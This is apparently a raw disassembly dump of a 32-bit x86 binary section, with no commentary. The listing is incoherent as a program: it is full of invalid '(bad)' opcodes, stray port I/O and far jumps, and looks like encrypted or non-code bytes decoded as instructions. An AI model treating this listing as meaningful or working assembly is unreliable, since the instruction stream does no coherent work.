  41edd4:	inc    esp
  41edd5:	mov    bl,0x6c
  41edd7:	push   0xfffffff7
  41edd9:	dec    edi
  41edda:	cmp    BYTE PTR [ebx],0x8f
  41eddd:	dec    ebp
  41edde:	stos   DWORD PTR es:[edi],eax
  41eddf:	mov    ah,0x3
  41ede1:	shl    cl,0x6f
  41ede4:	popa   
  41ede5:	add    al,0xdf
  41ede7:	xchg   edi,eax
  41ede8:	push   esp
  41ede9:	xlat   BYTE PTR ds:[ebx]
  41edea:	sub    ch,al
  41edec:	rcl    BYTE PTR [ebp+0x5bb73502],0x82
  41edf3:	mov    edi,0x29415e93
  41edf8:	mov    ebx,0xc42d7bbf
  41edfd:	call   0x7f6ff989
  41ee02:	lea    edi,[edx+0x18]
  41ee05:	xchg   BYTE PTR [eax+0x45631f1e],bl
  41ee0b:	in     al,0x56
  41ee0d:	je     0x41ee73
  41ee0f:	xor    eax,0x6d5b5b64
  41ee14:	fwait
  41ee15:	imul   BYTE PTR [edi]
  41ee17:	mov    bl,0x3e
  41ee19:	add    ch,BYTE PTR [esi-0x69]
  41ee1c:	push   0xffffffc3
  41ee1e:	or     eax,0x7378d81
  41ee23:	dec    esp
  41ee24:	iret   
  41ee25:	shl    DWORD PTR [edx],0x76
  41ee28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee29:	pop    eax
  41ee2a:	jmp    FWORD PTR [eax+0x1]
  41ee2d:	push   ebx
  41ee2e:	bound  ecx,QWORD PTR [ebp-0x30]
  41ee31:	retf   0x463c
  41ee34:	mov    ebx,0x31152afa
  41ee39:	pop    esp
  41ee3a:	jle    0x41eeb2
  41ee3c:	inc    eax
  41ee3d:	push   ds
  41ee3e:	or     DWORD PTR [ecx],eax
  41ee40:	jne    0x41ede4
  41ee42:	jbe    0x41ee95
  41ee44:	leave  
  41ee45:	mov    DWORD PTR [ebx],eax
  41ee47:	pop    ebp
  41ee48:	data16 cmp cl,BYTE PTR [ebx-0x53]
  41ee4c:	popf   
  41ee4d:	and    eax,DWORD PTR [edx+edi*1-0x1c]
  41ee51:	pop    ds
  41ee52:	add    al,0x6d
  41ee54:	fisttp DWORD PTR [edi+ebx*1]
  41ee57:	int    0xca
  41ee59:	cmp    cl,BYTE PTR [ebx+0x70288aea]
  41ee5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee60:	mov    bh,BYTE PTR ds:0xc7a6c26a
  41ee66:	jbe    0x41ee08
  41ee68:	xchg   edx,eax
  41ee69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee6a:	cdq    
  41ee6b:	mov    bl,0x67
  41ee6d:	rol    BYTE PTR ds:0x27fe219a,0x92
  41ee74:	pushf  
  41ee75:	xor    edi,DWORD PTR [edi*1+0x11d65847]
  41ee7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee7d:	jp     0x41ee39
  41ee7f:	(bad)  
  41ee80:	mov    ebp,DWORD PTR [edx-0x20]
  41ee83:	sbb    eax,0x443d39a0
  41ee88:	pop    esi
  41ee89:	push   0x32
  41ee8b:	(bad)  
  41ee8c:	cld    
  41ee8d:	push   0xffffffc6
  41ee8f:	xor    al,0x17
  41ee91:	lds    edx,FWORD PTR [esi+0x4e]
  41ee94:	pushfw 
  41ee96:	in     al,dx
  41ee97:	pop    ebp
  41ee98:	sahf   
  41ee99:	adc    BYTE PTR fs:[edi-0x308a32f0],0x52
  41eea1:	ds cli 
  41eea3:	pop    ecx
  41eea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea5:	mov    cl,0xad
  41eea7:	pop    edi
  41eea8:	sub    ah,BYTE PTR [edi-0x57]
  41eeab:	add    eax,0xedd72dd
  41eeb0:	jnp    0x41ee66
  41eeb2:	and    eax,DWORD PTR [ebx]
  41eeb4:	and    ebp,esi
  41eeb6:	or     dl,BYTE PTR [ebp+0x54]
  41eeb9:	xchg   esi,eax
  41eeba:	cdq    
  41eebb:	lock loope 0x41ee63
  41eebe:	lods   eax,DWORD PTR ds:[esi]
  41eebf:	mov    ds:0xf001a738,al
  41eec4:	test   eax,0x6dcbea6f
  41eec9:	add    ah,BYTE PTR [ebx]
  41eecb:	stos   DWORD PTR es:[edi],eax
  41eecc:	and    al,0x9c
  41eece:	sar    esi,1
  41eed0:	dec    ebx
  41eed1:	loope  0x41ef12
  41eed3:	js     0x41ef34
  41eed5:	in     al,0xf6
  41eed7:	fnstcw WORD PTR [edi-0x79]
  41eeda:	mov    ebp,0xf184b9bb
  41eedf:	jne    0x41ef46
  41eee1:	mov    ecx,0xea858de8
  41eee6:	shl    BYTE PTR [ecx-0x287e82ce],0xd5
  41eeed:	into   
  41eeee:	dec    ecx
  41eeef:	inc    esi
  41eef0:	add    DWORD PTR [ecx-0x1d0f3339],edi
  41eef6:	out    0xa6,eax
  41eef8:	shr    DWORD PTR [edx+0x5],cl
  41eefb:	add    bh,dl
  41eefd:	stc    
  41eefe:	daa    
  41eeff:	enter  0x55eb,0xe9
  41ef03:	icebp  
  41ef04:	into   
  41ef05:	mov    cl,0x42
  41ef07:	outs   dx,DWORD PTR ds:[esi]
  41ef08:	cwde   
  41ef09:	adc    al,0xb0
  41ef0b:	pop    ecx
  41ef0c:	inc    eax
  41ef0d:	int3   
  41ef0e:	cmp    ecx,DWORD PTR [ecx]
  41ef10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef11:	xor    cl,0xcc
  41ef14:	and    eax,0xe0414650
  41ef19:	adc    bl,BYTE PTR [ebx+0x44548d99]
  41ef1f:	nop
  41ef20:	or     ch,BYTE PTR [ebx]
  41ef22:	imul   ecx,DWORD PTR [ecx],0x71159183
  41ef28:	mov    esi,0x15c91486
  41ef2d:	and    eax,0x2e361664
  41ef32:	and    eax,0x23dbfc86
  41ef37:	add    esi,DWORD PTR [edx-0x592e97a7]
  41ef3d:	mov    ah,0xad
  41ef3f:	sti    
  41ef40:	mov    ch,0x49
  41ef42:	sub    edi,edi
  41ef44:	cld    
  41ef45:	das    
  41ef46:	call   0xc99481fb
  41ef4b:	mov    es,WORD PTR ds:0x16ab8317
  41ef51:	in     eax,0x7e
  41ef53:	stos   DWORD PTR es:[edi],eax
  41ef54:	jmp    0x41ef6a
  41ef56:	mov    ch,0x1c
  41ef58:	jb     0x41efa8
  41ef5a:	jae    0x41ef30
  41ef5c:	and    eax,ecx
  41ef5e:	jl     0x41eefe
  41ef60:	dec    ebx
  41ef61:	(bad)  
  41ef62:	(bad)  
  41ef63:	in     eax,dx
  41ef64:	mov    al,ds:0x3f5ed5f6
  41ef69:	gs mov edx,ebx
  41ef6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef6d:	das    
  41ef6e:	inc    ebx
  41ef6f:	repnz or esi,0x7577fc3a
  41ef76:	xchg   esp,eax
  41ef77:	sbb    DWORD PTR [edx-0x424d7e80],esp
  41ef7d:	mov    al,ds:0x800a1e00
  41ef82:	loop   0x41ef6f
  41ef84:	dec    esi
  41ef85:	out    dx,eax
  41ef86:	test   BYTE PTR [edx-0x5f],dh
  41ef89:	scas   al,BYTE PTR es:[edi]
  41ef8a:	(bad)  
  41ef8c:	jb     0x41eff6
  41ef8e:	jb     0x41ef2e
  41ef90:	or     BYTE PTR [eax-0xc4e4bcd],0x28
  41ef97:	xor    cl,dl
  41ef99:	push   ds
  41ef9a:	push   ds
  41ef9b:	adc    al,0x92
  41ef9d:	cmp    al,0x9
  41ef9f:	cmp    al,0xcc
  41efa1:	fld    DWORD PTR [edi]
  41efa3:	adc    al,0x7f
  41efa5:	inc    DWORD PTR [ebx]
  41efa7:	jbe    0x41f014
  41efa9:	mov    ebp,0xf7265aa
  41efae:	xor    eax,0x2af95562
  41efb3:	or     bl,BYTE PTR [ebp-0x76]
  41efb6:	pop    es
  41efb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb8:	sbb    DWORD PTR [ebx],eax
  41efba:	mov    bl,BYTE PTR ds:0x8da473b1
  41efc0:	mov    ds:0x95c36123,al
  41efc5:	mov    ah,0xd8
  41efc7:	popf   
  41efc8:	(bad)  
  41efc9:	mov    ds:0x1344ff68,eax
  41efce:	and    ecx,DWORD PTR [edx]
  41efd0:	xor    eax,DWORD PTR ds:[eax]
  41efd3:	mov    eax,0x368ee8f9
  41efd8:	mov    ebx,0x99ae4cbb
  41efdd:	mov    bl,0x83
  41efdf:	scas   al,BYTE PTR es:[edi]
  41efe0:	in     al,0xd0
  41efe2:	das    
  41efe3:	je     0x41efd2
  41efe5:	add    eax,DWORD PTR [ecx+esi*2]
  41efe8:	rdpmc  
  41efea:	imul   esi,DWORD PTR [ebx-0x10],0x97883c09
  41eff1:	aaa    
  41eff2:	adc    eax,0x82686752
  41eff7:	and    al,0x3e
  41eff9:	inc    esi
  41effa:	or     DWORD PTR [edx+ebx*2],edi
  41effd:	rol    DWORD PTR [ebx-0x2cb34cf1],1
  41f003:	in     al,0xb7
  41f005:	(bad)  
  41f007:	mov    al,ds:0xcb398e8b
  41f00c:	cld    
  41f00d:	mov    ecx,0xb9aaa2a5
  41f012:	loope  0x41f034
  41f014:	dec    esp
  41f015:	push   ds
  41f016:	cmp    eax,0xab57e77
  41f01b:	cmp    dh,BYTE PTR [eax-0x68fb8450]
  41f021:	sbb    al,0x3a
  41f023:	mov    ebx,0xcf524644
  41f028:	std    
  41f029:	and    esp,DWORD PTR [edx-0x593642e3]
  41f02f:	push   es
  41f030:	jns    0x41efe5
  41f032:	xchg   edi,eax
  41f033:	or     DWORD PTR [eax-0x3b],esp
  41f036:	loopne 0x41f089
  41f038:	cli    
  41f039:	enter  0x3347,0xf4
  41f03d:	aad    0xbb
  41f03f:	mov    ebx,0xf036f34a
  41f044:	adc    eax,0x7f8c9c0c
  41f049:	jo     0x41f0b8
  41f04b:	in     eax,0xda
  41f04d:	sbb    ch,BYTE PTR [eax-0x51]
  41f050:	fwait
  41f051:	scas   al,BYTE PTR es:[edi]
  41f052:	mov    DWORD PTR [ebx],0xc6ea70b2
  41f058:	popa   
  41f059:	pop    eax
  41f05a:	cmp    eax,0x64bbcc
  41f05f:	je     0x41f0a7
  41f061:	dec    eax
  41f062:	daa    
  41f063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f064:	push   edi
  41f065:	fld    DWORD PTR [esi+0x2f]
  41f068:	push   es
  41f069:	aad    0x96
  41f06b:	fcomp  QWORD PTR [ebx]
  41f06d:	xchg   ecx,eax
  41f06e:	cld    
  41f06f:	sbb    ebx,DWORD PTR [ecx+0x16]
  41f072:	xchg   edi,eax
  41f073:	add    DWORD PTR [edx],esi
  41f075:	in     eax,dx
  41f076:	pop    es
  41f077:	push   ebx
  41f078:	adc    eax,0xe47a3843
  41f07d:	les    edi,FWORD PTR [ecx]
  41f07f:	push   ebp
  41f080:	mov    ecx,0x48131b32
  41f085:	push   0x9239b47
  41f08a:	test   BYTE PTR [ecx+0x21],dh
  41f08d:	gs sahf 
  41f08f:	add    ch,BYTE PTR [ecx-0x1f]
  41f092:	mov    al,ds:0xa74ad913
  41f097:	pushf  
  41f098:	adc    bh,cl
  41f09a:	push   esi
  41f09b:	test   al,0xf
  41f09d:	ror    DWORD PTR [ebx*4+0x44e35ac5],0xca
  41f0a5:	clc    
  41f0a6:	mov    BYTE PTR [ebx-0x79455bac],dl
  41f0ac:	icebp  
  41f0ad:	fwait
  41f0ae:	aas    
  41f0af:	test   al,0xa5
  41f0b1:	cs and bl,bl
  41f0b4:	das    
  41f0b5:	(bad)
  41f0b8:	jo     0x41f064
  41f0ba:	cli    
  41f0bb:	or     ecx,DWORD PTR [ebp+0x4b]
  41f0be:	or     edi,ebp
  41f0c0:	stos   DWORD PTR es:[edi],eax
  41f0c1:	gs jecxz 0x41f110
  41f0c4:	btr    edx,esi
  41f0c7:	loopne 0x41f07b
  41f0c9:	adc    al,ch
  41f0cb:	cld    
  41f0cc:	nop
  41f0cd:	xor    al,bh
  41f0cf:	xor    esp,DWORD PTR [ebx+esi*2]
  41f0d2:	pop    eax
  41f0d3:	xchg   edi,eax
  41f0d4:	pushf  
  41f0d5:	mov    ds:0x8a1f4b27,al
  41f0da:	adc    ch,al
  41f0dc:	out    dx,al
  41f0dd:	loopne 0x41f08d
  41f0df:	xchg   ecx,eax
  41f0e0:	mov    DWORD PTR [ebp+0x33],0x9fc48775
  41f0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0e8:	out    dx,al
  41f0e9:	xchg   edx,ebp
  41f0eb:	arpl   WORD PTR [ebx],ax
  41f0ed:	aas    
  41f0ee:	gs mov ebp,0x1e353b54
  41f0f4:	xchg   edx,eax
  41f0f5:	sub    al,0x16
  41f0f7:	ror    BYTE PTR [edi],0xc3
  41f0fa:	cmp    ah,BYTE PTR [ecx]
  41f0fc:	mov    al,cs:0x11434309
  41f102:	inc    esp
  41f103:	popa   
  41f104:	in     al,dx
  41f105:	mov    dl,0xe2
  41f107:	out    0x44,al
  41f109:	push   edi
  41f10a:	mov    esi,DWORD PTR [edi-0x34063b4f]
  41f110:	int3   
  41f111:	add    DWORD PTR [si-0x77],0x21d8d63e
  41f119:	mov    cl,0x14
  41f11b:	stos   BYTE PTR es:[edi],al
  41f11c:	or     al,0xc0
  41f11e:	inc    esi
  41f11f:	in     al,0x74
  41f121:	repz jg 0x41f145
  41f124:	fistp  DWORD PTR [ebp+0x7d]
  41f127:	jmp    0x41f130
  41f129:	dec    eax
  41f12a:	(bad)  
  41f12b:	mov    al,al
  41f12d:	jp     0x41f1a2
  41f12f:	enter  0x6eb9,0x17
  41f133:	pop    ebx
  41f134:	aas    
  41f135:	cmc    
  41f136:	push   ecx
  41f137:	pop    ds
  41f138:	data16 in al,0x54
  41f13b:	mov    bl,BYTE PTR [ecx-0x5c]
  41f13e:	pop    ecx
  41f13f:	dec    eax
  41f140:	clc    
  41f141:	jmp    0x7239c969
  41f146:	jne    0x41f1b5
  41f148:	mov    esi,0x6040a79a
  41f14d:	or     eax,0x4d0abb41
  41f152:	add    ebp,0x2b
  41f155:	mov    ch,0xa1
  41f157:	xchg   esp,eax
  41f158:	cmp    ah,bh
  41f15a:	xor    ch,BYTE PTR [edi-0xa803e21]
  41f160:	and    esp,ebp
  41f162:	data16 sbb ch,ah
  41f165:	mov    ch,0x33
  41f167:	jl     0x41f1d9
  41f169:	xor    BYTE PTR [eax+0x7c7d2815],0x6a
  41f170:	xor    al,0xdb
  41f172:	mov    bh,BYTE PTR [edi]
  41f174:	pop    ds
  41f175:	push   cs
  41f176:	cmp    ch,dh
  41f178:	cmp    esp,DWORD PTR [edi-0x50cb867d]
  41f17e:	inc    eax
  41f17f:	jmp    0x2ce14968
  41f184:	push   cs
  41f185:	xor    cl,dl
  41f187:	inc    edi
  41f188:	xchg   esi,eax
  41f189:	mov    ch,0x12
  41f18b:	arpl   WORD PTR [eax],sp
  41f18d:	sub    al,0x58
  41f18f:	push   ebp
  41f190:	std    
  41f191:	xor    al,0x4b
  41f193:	push   ebp
  41f194:	ins    BYTE PTR es:[edi],dx
  41f195:	add    ebx,DWORD PTR [ecx]
  41f197:	adc    BYTE PTR ds:0xeadd1592,cl
  41f19d:	shl    al,0x68
  41f1a0:	mov    esp,0xa17a905f
  41f1a5:	mov    al,ds:0x4216af10
  41f1aa:	fdiv   QWORD PTR [ecx+0x6d]
  41f1ad:	test   DWORD PTR [edi-0x46b49195],ebp
  41f1b3:	add    al,0xf8
  41f1b5:	mov    DWORD PTR [ebp-0x4edb007a],ecx
  41f1bb:	fwait
  41f1bc:	dec    ebp
  41f1bd:	jge    0x41f186
  41f1bf:	dec    edx
  41f1c0:	mov    ds:0xb0260fc8,al
  41f1c5:	add    esi,0xc27a62c7
  41f1cb:	aad    0x13
  41f1cd:	jno    0x41f1ef
  41f1cf:	xor    dh,BYTE PTR [ecx+0x4dcd8451]
  41f1d5:	mov    edx,0x263063c4
  41f1da:	sbb    esp,DWORD PTR [esi+0x5d]
  41f1dd:	cli    
  41f1de:	sub    dh,BYTE PTR [eax-0x7e8a3c33]
  41f1e4:	adc    esi,esi
  41f1e6:	inc    edx
  41f1e7:	loop   0x41f184
  41f1e9:	pop    ebp
  41f1ea:	xchg   ebx,eax
  41f1eb:	icebp  
  41f1ec:	mov    eax,0xa3395135
  41f1f1:	std    
  41f1f2:	dec    ecx
  41f1f3:	addr16 pushf 
  41f1f5:	mov    ebp,0x61a9e4b3
  41f1fa:	jmp    0x41f249
  41f1fc:	loopne 0x41f242
  41f1fe:	in     al,0x6d
  41f200:	mov    dl,0x37
  41f202:	inc    ecx
  41f203:	fcomp  DWORD PTR [ebx+0x62]
  41f206:	sbb    al,0x53
  41f208:	cmp    al,0x55
  41f20a:	outs   dx,BYTE PTR ds:[esi]
  41f20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f20c:	sar    BYTE PTR [esi-0x34],cl
  41f20f:	data16 mov ?,WORD PTR [eax-0x1a]
  41f213:	jae    0x41f248
  41f215:	mov    ds:0x8cb5e477,al
  41f21a:	in     al,0xfb
  41f21c:	loop   0x41f296
  41f21e:	arpl   dx,di
  41f220:	adc    ecx,DWORD PTR [ebp-0x65]
  41f223:	pop    ss
  41f224:	sub    edx,DWORD PTR [edi-0x20]
  41f227:	pop    esi
  41f228:	mov    eax,0xb123ce4b
  41f22d:	pop    ecx
  41f22e:	cwde   
  41f22f:	and    BYTE PTR [ebp-0x68],0x62
  41f233:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f234:	xchg   edi,eax
  41f235:	push   ebx
  41f236:	(bad)  [edx+0x5]
  41f239:	loopne 0x41f2b8
  41f23b:	and    BYTE PTR ds:0xeb54f149,bh
  41f241:	jns    0x41f206
  41f243:	(bad)  
  41f245:	cli    
  41f246:	sbb    esp,DWORD PTR [ebx-0xd]
  41f249:	fwait
  41f24a:	pop    ebp
  41f24b:	mov    ds:0xf226982d,al
  41f250:	sbb    eax,0x88d11fdb
  41f255:	pop    esi
  41f256:	mov    ebx,0x7c616d63
  41f25b:	(bad)  
  41f25d:	imul   esi,DWORD PTR [eax+0x9],0xfd9583a2
  41f264:	les    edx,FWORD PTR [eax-0x6a]
  41f267:	ins    BYTE PTR es:[edi],dx
  41f268:	jecxz  0x41f217
  41f26a:	mov    edi,DWORD PTR [esi+0x6f]
  41f26d:	test   eax,0x6340a3c6
  41f272:	xchg   edx,eax
  41f273:	pop    es
  41f274:	or     BYTE PTR [edx-0x25],ch
  41f277:	in     al,dx
  41f278:	push   ecx
  41f279:	neg    DWORD PTR [ecx]
  41f27b:	std    
  41f27c:	aas    
  41f27d:	push   ebp
  41f27e:	fbstp  TBYTE PTR [edi-0x2a]
  41f281:	inc    ebp
  41f282:	in     al,dx
  41f283:	scas   al,BYTE PTR es:[edi]
  41f284:	ds cwde 
  41f286:	inc    edi
  41f287:	pop    ebx
  41f288:	outs   dx,DWORD PTR ds:[esi]
  41f289:	bound  ebx,QWORD PTR [ebp-0x7d]
  41f28c:	neg    DWORD PTR [edx+0x26ae7c51]
  41f292:	call   ebp
  41f294:	inc    edx
  41f295:	pop    ebp
  41f296:	inc    edx
  41f297:	mov    WORD PTR ds:0x28805435,ss
  41f29d:	mov    esp,0x19d4f6ad
  41f2a2:	add    DWORD PTR [ebx-0x32],eax
  41f2a5:	sbb    edi,DWORD PTR [ecx]
  41f2a7:	jno    0x41f31d
  41f2a9:	mov    ebx,0xef7d1bd9
  41f2ae:	jb     0x41f279
  41f2b0:	jl     0x41f2dc
  41f2b2:	aam    0xe9
  41f2b4:	rol    BYTE PTR [edi],cl
  41f2b6:	and    al,0xf3
  41f2b8:	inc    ebx
  41f2b9:	adc    ch,cl
  41f2bb:	enter  0xbdca,0xd8
  41f2bf:	xchg   ebx,eax
  41f2c0:	pop    eax
  41f2c1:	pusha  
  41f2c2:	out    dx,eax
  41f2c3:	(bad)  
  41f2c5:	jmp    0x33cf:0x63bbc9d4
  41f2cc:	ss in  eax,0x96
  41f2cf:	(bad)  
  41f2d0:	and    DWORD PTR [ebx],ecx
  41f2d2:	rol    ecx,1
  41f2d4:	dec    esp
  41f2d5:	and    al,0x9d
  41f2d7:	(bad)  
  41f2d8:	retf   0x38e1
  41f2db:	xor    DWORD PTR [eax+eiz*4+0x57],0x3183b913
  41f2e3:	sbb    BYTE PTR [edi-0x7ef986f7],ah
  41f2e9:	inc    edi
  41f2ea:	sub    al,0xee
  41f2ec:	fst    DWORD PTR [eax-0x528ff7d5]
  41f2f2:	gs jno 0x41f2b0
  41f2f5:	jmp    DWORD PTR [edi]
  41f2f7:	inc    esi
  41f2f8:	out    dx,eax
  41f2f9:	shl    ah,cl
  41f2fb:	xchg   edi,eax
  41f2fc:	aad    0x0
  41f2fe:	jmp    FWORD PTR [esi-0x610e00]
  41f304:	das    
  41f305:	je     0x41f2a1
  41f307:	jge    0x41f346
  41f309:	xchg   edx,eax
  41f30a:	ret    
  41f30b:	sub    DWORD PTR [ecx-0x50],0xffffff8d
  41f30f:	xor    eax,0x86d07b23
  41f314:	xchg   esi,eax
  41f315:	mov    eax,ds:0x996cc9ce
  41f31a:	jno    0x41f313
  41f31c:	dec    ecx
  41f31d:	into   
  41f31e:	or     al,0xd5
  41f320:	int3   
  41f321:	pop    es
  41f322:	lods   eax,DWORD PTR ds:[esi]
  41f323:	out    0xc,al
  41f325:	rcr    DWORD PTR [ecx+0x76],cl
  41f328:	xchg   DWORD PTR [esi+0x60299476],esi
  41f32e:	sar    BYTE PTR [esi+ebx*8],cl
  41f331:	or     esi,DWORD PTR [ebx-0x6731d7c9]
  41f337:	adc    ah,dl
  41f339:	fcom   DWORD PTR [edi+ebp*2-0x3af50b96]
  41f340:	ficom  DWORD PTR [eax+ebp*4]
  41f343:	mov    al,0x4
  41f345:	adc    DWORD PTR [ebp+0x19],edx
  41f348:	call   0x489a:0x3389352d
  41f34f:	fldenv [esi+0x5849c33a]
  41f355:	idiv   DWORD PTR [ecx+ecx*4+0x61c18057]
  41f35c:	test   DWORD PTR [edi],0x2733ab2c
  41f362:	xchg   BYTE PTR [eax+0x167ef479],bh
  41f368:	fld    TBYTE PTR [esi+0xd]
  41f36b:	sbb    al,0x52
  41f36d:	and    ch,dl
  41f36f:	and    BYTE PTR [esi-0x39090297],0x55
  41f376:	xor    BYTE PTR [esi],dl
  41f378:	in     eax,0xb4
  41f37a:	icebp  
  41f37b:	cmc    
  41f37c:	mov    ebx,0xfc86e349
  41f381:	xlat   BYTE PTR ds:[ebx]
  41f382:	aad    0x9c
  41f384:	fcomp  st(7)
  41f386:	int3   
  41f387:	in     al,dx
  41f388:	jo     0x41f3eb
  41f38a:	mov    bl,0xb7
  41f38c:	jns    0x41f379
  41f38e:	fist   WORD PTR [esi-0x55]
  41f391:	idiv   DWORD PTR [ebx+edi*4-0x2d0828b1]
  41f398:	ds out 0x7d,eax
  41f39b:	dec    eax
  41f39c:	sahf   
  41f39d:	test   al,0x1a
  41f39f:	dec    ebp
  41f3a0:	shr    BYTE PTR [esi+0x41],1
  41f3a3:	fstp   TBYTE PTR [ebx]
  41f3a5:	cwde   
  41f3a6:	mov    eax,0x55ea85eb
  41f3ab:	shr    DWORD PTR [eax],cl
  41f3ad:	cmp    BYTE PTR [edx+0x72],dl
  41f3b0:	daa    
  41f3b1:	push   edx
  41f3b2:	mov    ah,0x63
  41f3b4:	lock or al,0x8e
  41f3b7:	clc    
  41f3b8:	push   cs
  41f3b9:	dec    eax
  41f3ba:	xchg   esi,eax
  41f3bb:	inc    esi
  41f3bc:	inc    esp
  41f3bd:	xor    DWORD PTR [esi+0x21cb6f70],0xffffffa7
  41f3c4:	test   al,0xa1
  41f3c6:	daa    
  41f3c7:	stos   DWORD PTR es:[edi],eax
  41f3c8:	pop    es
  41f3c9:	push   es
  41f3ca:	xchg   edx,eax
  41f3cb:	xor    ah,BYTE PTR [edx+0x2fe82401]
  41f3d1:	push   es
  41f3d2:	retf   0x4113
  41f3d5:	mov    ds:0xdd1f6e06,al
  41f3da:	dec    ebx
  41f3db:	fist   WORD PTR [ebx-0x1f2dd51d]
  41f3e1:	outs   dx,BYTE PTR ds:[esi]
  41f3e2:	or     BYTE PTR [edx+0x13bf8862],ch
  41f3e8:	out    0x34,al
  41f3ea:	in     eax,0xaa
  41f3ec:	pop    ebp
  41f3ed:	sub    edi,DWORD PTR [edi+0x55]
  41f3f0:	ins    DWORD PTR es:[edi],dx
  41f3f1:	cmp    eax,0x29e35ac7
  41f3f6:	xor    esp,DWORD PTR [esi-0x6]
  41f3f9:	ret    
  41f3fa:	div    edx
  41f3fc:	push   eax
  41f3fd:	dec    ebx
  41f3fe:	adc    BYTE PTR [ecx+0x7c06f705],dh
  41f404:	mov    dl,cl
  41f406:	xchg   DWORD PTR [eax*1+0x62b1c40d],esi
  41f40d:	fwait
  41f40e:	xchg   ebx,ebp
  41f410:	xor    ecx,ebp
  41f412:	inc    eax
  41f413:	in     eax,dx
  41f414:	cmp    eax,0xea83da00
  41f419:	pusha  
  41f41a:	fisttp WORD PTR [ebp+0x620e87b6]
  41f420:	(bad)  
  41f421:	sbb    ebx,esp
  41f423:	and    DWORD PTR [ebp+0x3e91a08d],edx
  41f429:	inc    edi
  41f42a:	inc    esp
  41f42b:	push   0xbd90d8ce
  41f430:	sub    DWORD PTR [eax],esi
  41f432:	mov    al,0x46
  41f434:	inc    ecx
  41f435:	pop    esi
  41f436:	shl    BYTE PTR [ebp-0x1f],cl
  41f439:	rcr    BYTE PTR [ebx+0x56],1
  41f43c:	test   DWORD PTR [edi],esi
  41f43e:	adc    eax,0x97aa603e
  41f443:	mov    dh,0x63
  41f445:	jnp    0x41f438
  41f447:	addr16 mov ah,0xdb
  41f44a:	sub    esi,DWORD PTR [ebp-0x214b199a]
  41f450:	adc    bh,BYTE PTR [edx-0x40dd6a2f]
  41f456:	dec    ebx
  41f457:	pop    edi
  41f458:	pop    eax
  41f459:	cmp    bh,bl
  41f45b:	scas   al,BYTE PTR es:[edi]
  41f45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f45d:	pop    edi
  41f45e:	xchg   edx,eax
  41f45f:	pop    ss
  41f460:	into   
  41f461:	jge    0x41f49e
  41f463:	outs   dx,DWORD PTR ds:[esi]
  41f464:	sbb    ah,bl
  41f466:	jl     0x41f404
  41f468:	sub    eax,0xae13a8d8
  41f46d:	pop    edx
  41f46e:	adc    ah,bl
  41f470:	(bad)  
  41f471:	leave  
  41f472:	aad    0x1
  41f474:	jecxz  0x41f498
  41f476:	clc    
  41f477:	mov    WORD PTR [edx+0x2eb87e04],es
  41f47d:	mov    ds:0xebddb39f,al
  41f482:	adc    BYTE PTR [edx-0x1a93f594],cl
  41f488:	int    0xfa
  41f48a:	adc    DWORD PTR [ebx+0x1b6481a1],ebp
  41f490:	ficomp DWORD PTR [edx+0x2c0caf4c]
  41f496:	stos   DWORD PTR es:[edi],eax
  41f497:	jle    0x41f4ee
  41f499:	out    dx,al
  41f49a:	and    BYTE PTR [edx+0x2fe8fa0d],dh
  41f4a0:	(bad)  
  41f4a1:	hlt    
  41f4a2:	sbb    DWORD PTR [edx+0x63ea8a4],0x68
  41f4a9:	in     eax,dx
  41f4aa:	xor    ch,ah
  41f4ac:	or     eax,edi
  41f4ae:	mov    edx,0x1afda3f6
  41f4b3:	loopne 0x41f461
  41f4b5:	cmp    edx,DWORD PTR [esi-0x65dea10f]
  41f4bb:	(bad)  [edx]
  41f4bd:	xor    ah,bl
  41f4bf:	ins    BYTE PTR es:[edi],dx
  41f4c0:	outs   dx,DWORD PTR ds:[esi]
  41f4c1:	xchg   ebx,eax
  41f4c2:	enter  0x2ac9,0xf
  41f4c6:	sbb    ah,dh
  41f4c8:	repz pop ebp
  41f4ca:	in     eax,dx
  41f4cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4cc:	pop    ebx
  41f4cd:	cmp    al,0x88
  41f4cf:	(bad)  
  41f4d0:	hlt    
  41f4d1:	nop
  41f4d2:	or     eax,0xe3302e85
  41f4d7:	xor    edx,DWORD PTR [ecx+eax*8]
  41f4da:	xlat   BYTE PTR ds:[ebx]
  41f4dc:	jge    0x41f4b7
  41f4de:	xchg   WORD PTR [ebx-0x33],ax
  41f4e2:	mov    al,ds:0x9e863d9b
  41f4e7:	pusha  
  41f4e8:	mov    bh,0x7d
  41f4ea:	cmp    BYTE PTR [edi-0x66],dl
  41f4ed:	push   0xe89a6952
  41f4f2:	inc    edi
  41f4f3:	fwait
  41f4f4:	cmp    al,0x69
  41f4f6:	call   0xccda:0xc1b693d
  41f4fd:	xor    DWORD PTR [ebp-0x13],ebx
  41f500:	pop    es
  41f501:	or     ch,cl
  41f503:	cmp    esp,DWORD PTR [ecx-0x54]
  41f506:	out    0xa3,al
  41f508:	js     0x41f551
  41f50a:	js     0x41f57d
  41f50c:	mov    esp,edx
  41f50e:	jmp    0x41f4be
  41f510:	ja     0x41f4fc
  41f512:	xchg   esi,eax
  41f513:	jmp    0x41bfdb3b
  41f518:	loope  0x41f4b2
  41f51a:	or     ebp,DWORD PTR [ebp+0x51db957c]
  41f520:	jne    0x41f4f3
  41f522:	hlt    
  41f523:	je     0x41f4d2
  41f525:	aaa    
  41f526:	loopne 0x41f55c
  41f528:	adc    esi,edx
  41f52a:	popa   
  41f52b:	mov    bl,0x22
  41f52d:	xor    DWORD PTR [ebp-0x2f004c74],ebp
  41f533:	pop    es
  41f534:	(bad)  [ebp+0x26]
  41f537:	pop    esi
  41f538:	jge    0x41f5a1
  41f53a:	arpl   WORD PTR [edi-0x42862841],cx
  41f540:	sub    dl,BYTE PTR [ebx+0x6b803518]
